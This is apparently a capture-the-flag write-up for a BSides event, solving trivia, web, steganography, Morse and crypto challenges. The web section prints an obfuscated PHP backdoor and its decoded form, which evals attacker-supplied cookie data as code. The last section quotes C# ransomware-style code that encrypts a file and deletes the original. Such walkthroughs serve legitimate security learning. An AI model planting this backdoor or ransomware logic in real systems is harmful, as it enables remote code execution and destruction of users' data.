# General Information : 130 Point in 4 Challenge
- Rocker : 20 Point

I attack was published about me in Defcon Conference in 2011 I gain access to your phone during the charging process
to execute attack you need a cable that supports power and data connection together
The is Flag `juice jacking`

- Search with police  : 30 Point

I'm a new tool developed by a company who unlocked ios phone in a terrorist attack in San Bernardino, California.
This tool developed to a physical analyzer for smartphones like android and ios
The is Flag `UFED`

- Vegetables : 30 Point

I'm an operating system based on Linux designed to encrypt your data using onion routing and works through USB only
The is Flag `Tails`


- WhoAmi : 50 Point

I'm Jack and I have a penetration testing process for Automated Teller Machine and I don't have any money to buy rubber ducky or any advanced kits.
I've seen on the internet that I can do this tool with myself with some tools based on open-source hardware, I need something can simulate rubber ducky to inject code and enable PowerShell command or execute a command on Windows...
What's the name of this piece amid the family names?
The is Flag `leonardo`

# Web Challenge : d3c0d3 m3 50 Point
- The Challenge is a [zip](https://github.com/X-Vector/CTF/blob/master/Bsides/c99.zip) file Which Contain a php code
```
<?php
$kyo1="JGM9J2NvdW50JzskYT0kX0NPT0tecJRTtecpZihyZecXecNecldCgkYSeck9PSecdecmbCcgJiYgJGMecoJGEpPjMpe2luaec";
$kyo3="zectldmFsecKGecJhc2Uec2NF9kZWNvZGUocHJlZ19ecyZXecBsYWNlKGecFycmF5KCcvW15cdz1cc1ec0vJywnL1xeczLycpLCBhcnJ";
$gj = "bcoxacoxse64cox_coxdcoxecoxccoxode";
$kyo4="heecSgnJywnKycpLCBqb2luKGecFyeccmF5X3NsaWNlKCecRhLCRjKCRhKS0zKSkpKSeckec7ZWNobyAnPC8nLiRrLiecc+Jzt9";
$iuq = "str_replace";
$kyo2="V9zZecXQoJ2Vyeccm9yX2xvZycecsICcvecZGV2L251bGwnKTskecaecz0nYWd7aGlkZGVuecX2eclecuX3BocH0nO2VjecaG8gJzwnLeciRecrLic+J";
$gj = $iuq("cox", "", $gj);
eval($gj($iuq("ec", "", $kyo1.$kyo2.$kyo3.$kyo4)));
?>
```
- first the variable `$iuq` containe a php built in function which is used to replcae any this words `ec` in this variables `$kyo1,$kyo2,$kyo3,$kyo4` with nothing then when excute the code the output will be

```
JGM9J2NvdW50JzskYT0kX0NPT0tJRTtpZihyZXNldCgkYSk9PSdmbCcgJiYgJGMoJGEpPjMpe2luaV9zZXQoJ2Vycm9yX2xvZycsICcvZGV2L251bGwnKTskaz0nYWd7aGlkZGVuX2luX3BocH0nO2VjaG8gJzwnLiRrLic+JztldmFsKGJhc2U2NF9kZWNvZGUocHJlZ19yZXBsYWNlKGFycmF5KCcvW15cdz1cc10vJywnL1xzLycpLCBhcnJheSgnJywnKycpLCBqb2luKGFycmF5X3NsaWNlKCRhLCRjKCRhKS0zKSkpKSk7ZWNobyAnPC8nLiRrLic+Jzt9
```
- decode it with base64 then the output will be
```
$c='count';$a=$_COOKIE;if(reset($a)=='fl' && $c($a)>3){ini_set('error_log', '/dev/null');$k='ag{hidden_in_php}';echo '<'.$k.'>';eval(base64_decode(preg_replace(array('/[^\w=\s]/','/\s/'), array('','+'), join(array_slice($a,$c($a)-3)))));echo '</'.$k.'>';}
```
- you will see that variable `$a` is `fl` and variable `$k` is `ag{hidden_in_php}` so your flag is `flag{hidden_in_php}`

# Steganography : Zoom Eye 50 Point
- The Challenge is a [zip](https://github.com/X-Vector/CTF/blob/master/Bsides/invokeme.zip) file Which Contain a image They Give us The Password of zip file `squnity`
- I'm Extract The zip file and found that the image is 13 Mbyte , So There a something hidden in the photo
- I'm used steghide in linux `steghide extract -sf rockme.jpg` , you can install it `apt install steghide`
- steghide requierd a password !!! , I see The Photo and zoom in When I found This Words With Grey Color :D
![Password](https://github.com/X-Vector/CTF/blob/master/Bsides/stage2.png?raw=true)
- I try to set this words `l3757ryh4rd3r` as password and the reinvoke.txt file is output
- The File Contain This Character and string
```
{@C6> xADF> :D D:>A=J 5F>>J E6IE @7 E96 AC:?E:?8 2?5 EJA6D6EE:?8 :?5FDECJ] {@C6> xADF> 92D 366? E96 :?5FDECJVD DE2?52C5 5F>>J E6IE 6G6C D:?46 E96 `d__D[ H96? 2? F?<?@H? AC:?E6C E@@< 2 82==6J @7 EJA6 2?5 D4C2>3=65 :E E@ >2<6 2 EJA6 DA64:>6? 3@@<] xE 92D DFCG:G65 ?@E @?=J 7:G6 46?EFC:6D[ 3FE 2=D@ E96 =62A :?E@ 6=64EC@?:4 EJA6D6EE:?8[ C6>2:?:?8 6DD6?E:2==J F?492?865] xE H2D A@AF=2C:D65 :? E96 `he_D H:E9 E96 C6=62D6 @7 {6EC2D6E D966ED 4@?E2:?:?8 {@C6> xADF> A2DD286D[ 2?5 >@C6 C646?E=J H:E9 56D<E@A AF3=:D9:?8 D@7EH2C6 =:<6 p=5FD !286|2<6C :?4=F5:?8 G6CD:@?D @7 {@C6> xADF>]
7=28L5bGb=_Ab507_C0fc=b?fdN
```
- I Think and search in google When I found it's rot47
- I go to [decode.fr](https://www.dcode.fr/rot-47-cipher) and decode it , The Output is
```
Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.
flag{d3v3l0p3d_f0r_74l3n75}flag{d3v3l0p3d_f0r_74l3n75}
```
- Then The Flag is `flag{d3v3l0p3d_f0r_74l3n75}`

# Crypto Challenge : abusing 50 Point
- The Challenge is a [mp3](https://github.com/X-Vector/CTF/blob/master/Bsides/abusing.mp3) file Which This Sound Like Morse code
- Go to this [website](https://morsecode.scphillips.com/labs/audio-decoder-adaptive/) then upload mp3 file and you get this result
![Morse code](https://github.com/X-Vector/CTF/blob/master/Bsides/morse.png?raw=true)
- We Play in This Words `ETTE L A G I N M C O D E W E T R U S T` To Get This Result `FLAGINMCODEWETRUST` Then We Submit and we get is wrong Then we add `{}_` to words to be `FLAG{IN_MCODE_TRUST}` and Flag is Correct

# Crypto Challenge : Ransom where ! 100 Point
- The Challenge is a [zip]() file which contain some file and a file called `Ransomware.exe`

- we have a two cs file `cryptography.cs` and  `Program.cs`
- The File `cryptography.cs` comtaine The Function That used in Encryption and The file `Program.cs` is a main File
- in `Program.cs` we have this code
```
Random random = new Random();
int value = random.Next(10000000, 1211656790);
int value2 = random.Next(10000000, 1211656790);
int value3 = random.Next(10000000, 1211656790);
int value4 = random.Next(10000000, 1211656790);
int value5 = random.Next(10000000, 1211656790);
string str = ".tmp";
BigInteger left = BigInteger.Multiply(value, value2);
left += BigInteger.Multiply(value2, value3);
left += BigInteger.Multiply(value3, value4);
left += BigInteger.Multiply(value4, value5);
left += BigInteger.Multiply(value5, value);
BigInteger[] array = new BigInteger[]
{
              BigInteger.Parse("318540665379393469901456665807211509077755719995811520039095212139429238053864597311950397094944291616119321660193803737677538864969915331331528398734504661147661499115125056479426948683504604460936703005724827506058051215012025774714463561829608252938657297504427643593752676857551877096958959488289759878259498255905255543409142370769036479607835226542428818361327569095305960454592450213005148130508649794732855515489990191085723757628463901282599712670814223322126866814011761400443596552984309315434653984387419451894484613987942298157348306834118923950284809853541881602043240244910348705406353947587203832407"),
  BigInteger.Parse("338630205260455689413627911306068443537112802550361922213620660503310212139001530156458392949653034244789612680980241965923780722889133495349537107789761426092510299239678696031652780059016898519278860185536978111680123402473365833456785718098200501968322228116681190425490850863660038143310790555506293106653050174262471649179173093656763946257235681980586392230447218179278964626176124426615857733950102117938674282636936094069075258237416065546593509302494726576026227551920883962084579635168761189995794814926094510046419165007371450799003658587100556051088147493947712592469412133312536422828670173807709914587")
};
string str2 = Program.RandomString(5);
```
- Which we have 5 variable `value,value2,value3,value4,value5` That take a random Number and `str` Which contain `.tmp` and variable `left` Which equal
` value*value2 + value2*value3 + value3*value4 + value4*value5 + value5*value ` and We have array `BigInteger` that containe Two Big integer Number
and a string variable `str2` that have a five random string
- and in `Program.cs` We have this code
```
File.WriteAllText(Path.GetTempPath() + str2 + str, Convert.ToString(cryptography.RSA_m_n_e(left.ToString(), array[1], array[0])));
```
- We have a file that saved in our path which his name is the 5 random string with .tmp extension
- This File contain The result of function `cryptography.RSA_m_n_e(left.ToString(), array[1], array[0]))`
- When I See this Function in `cryptography.cs` I Found That take 3 Parameter Which The First is string Which is Coming from The result of left and The Secound Parameter Take The second BigInteger in array and the Third take the First BigInteger in array
- This Function is RSA Function Which This Attack is Wiener Attack Becouse `e` is Very BigInteger
- Let's see The tmp file That Saved in ourpath
- We have 4 file which have 5 string and this extension is .tmp and all of them contain a BigInteger
- The RSA Function encode the Plaintext and saved the Cipher in a one file from our 4 file , So I decode all cipher in 4 files and get this Number
```
3599427841201158309
2281123928613928259
1613383286900676679
2413992114436498344
```
- You Can use My [RSA Tool](https://github.com/X-Vector/X-RSA) That I publish it in github To decode This RSA Attack and decode other Attacks
- Now This Numbers contain a right random number
- We have This code in `Program.cs`
```
string s = File.ReadAllText(".\\sdagfsad.txt");
byte[] bytes = Encoding.UTF8.GetBytes(s);
string contents = cryptography.Aes(bytes, left.ToString(), "ABCDEFGHIJ12", true, false);
File.WriteAllText(".\\dsafgasf.txt", contents);
File.Delete(".\\sdagfsad.txt");
}
```
- in The Third Linr of This Code , We have a AES Encryption Function When We go to `cryptography.cs` We see that in this Code
```
public static string Aes(byte[] input, string key, string iv, bool Enc, bool Dec)
{
  new UTF8Encoding();
  AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
  aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
  aesCryptoServiceProvider.KeySize = 256;
  aesCryptoServiceProvider.Key = Convert.FromBase64String(cryptography.sha2(key));
  aesCryptoServiceProvider.BlockSize = 128;
  aesCryptoServiceProvider.IV = Convert.FromBase64String(cryptography.md5(iv));
  aesCryptoServiceProvider.Mode = CipherMode.CBC;
  if (Enc && !Dec)
  {
    ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateEncryptor();
    byte[] array = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
    return Convert.ToBase64String(array);
  }
  if (!Enc && Dec)
  {
    ICryptoTransform cryptoTransform2 = aesCryptoServiceProvider.CreateDecryptor();
    byte[] array = cryptoTransform2.TransformFinalBlock(input, 0, input.Length);
    return Encoding.ASCII.GetString(array);
  }
  return null;
}
```
- He use a CBC_MODE and The Keysize is 256 bits and BlockSize is 128 bit
- He Give Me iv and i have 4 random number on of them is a right number so I Try all Number With His Function and The Cipher is saved in dsafgasf.txt and iv is `ABCDEFGHIJ12`
- So I call AES Function in this figure `cryptography.Aes(bytes, MyRandomKey, "ABCDEFGHIJ12", false, true)` in 4 Random number
- Then The Flag is `vb$_dr0pp3r5_4r3_c0mm0n`
